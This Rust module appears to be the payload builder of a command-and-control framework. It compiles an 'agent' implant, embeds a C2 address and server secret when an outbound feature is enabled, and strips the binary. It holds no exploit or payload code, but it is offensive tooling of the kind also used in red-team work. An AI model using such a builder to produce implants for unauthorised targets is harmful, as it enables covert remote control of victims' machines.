//! Payload build pipeline: cargo build → strip → encrypt → write to `dist/`.

use anyhow::{anyhow, Context, Result};
use std::path::{Path, PathBuf};
use std::process::Command;
use tracing::{info, warn};

use crate::config::{partition_features, read_agent_features, PayloadConfig};


/// Build the agent for the given profile and return the raw binary bytes.
pub fn build_agent_for_profile(cfg: &PayloadConfig) -> Result<Vec<u8>> {
    let triple = cfg.target_triple()?;
    let package = cfg.package.as_str();

    let available = read_agent_features().unwrap_or_default();
    let (effective_features, unknown_features) = if available.is_empty() {
        (cfg.features.clone(), Vec::new())
    } else {
        partition_features(&cfg.features, &available)
    };
    for f in &unknown_features {
        warn!("profile feature `{f}` is not declared in agent/Cargo.toml; ignoring it");
    }

    let mut extra_env: Vec<(String, String)> = Vec::new();
    if effective_features.iter().any(|f| f == "outbound-c") {
        extra_env.push(("ORCHESTRA_C_ADDR".into(), cfg.c2_address.clone()));
        if let Some(ref secret) = cfg.c_server_secret {
            extra_env.push(("ORCHESTRA_C_SECRET".into(), secret.clone()));
        } else {
            warn!(
                "outbound-c feature enabled but c_server_secret is not set in the profile. \
                 The agent will require the ORCHESTRA_SECRET env var at runtime."
            );
        }
    }

    let bin_name = cfg.bin_name.as_deref().unwrap_or(package);

    info!(target_triple = %triple, package, bin = %bin_name, "Building agent payload");
    let bin_path = cargo_build(package, bin_name, &triple, &effective_features, &extra_env)?;

    if let Err(e) = strip_if_available(&bin_path) {
        warn!("strip step skipped: {e:#}");
    }

    std::fs::read(&bin_path)
        .with_context(|| format!("Failed to read built binary {}", bin_path.display()))
}

/// Run `cargo build --release` for the specified package and target.
fn cargo_build(
    package: &str,
    bin: &str,
    triple: &str,
    features: &[String],
    extra_env: &[(String, String)],
) -> Result<PathBuf> {
    let mut args = vec![
        "build".to_string(),
        "--release".to_string(),
        "--package".to_string(),
        package.to_string(),
        "--bin".to_string(),
        bin.to_string(),
        "--target".to_string(),
        triple.to_string(),
    ];
    if !features.is_empty() {
        args.push("--features".to_string());
        args.push(features.join(","));
    }

    let mut cmd = Command::new("cargo");
    cmd.args(&args).envs(extra_env.iter().cloned());

    info!("Running: {:?}", cmd);
    let status = cmd
        .status()
        .with_context(|| format!("Failed to execute cargo build for {package}"))?;

    if !status.success() {
        return Err(anyhow!("cargo build for {package} failed"));
    }

    // The final binary is in `target/<triple>/release/<bin_name>`.
    let path = Path::new("target").join(triple).join("release").join(bin);
    Ok(path)
}

/// Run `strip` on the binary if the tool is available.
fn strip_if_available(path: &Path) -> Result<()> {
    let strip = which::which("strip").map_err(|e| anyhow!("`strip` not on PATH: {e}"))?;
    info!("Stripping binary with {}", strip.display());
    let status = Command::new(strip)
        .arg(path)
        .status()
        .context("Failed to run `strip`")?;
    if !status.success() {
        warn!("strip command failed");
    }
    Ok(())
}
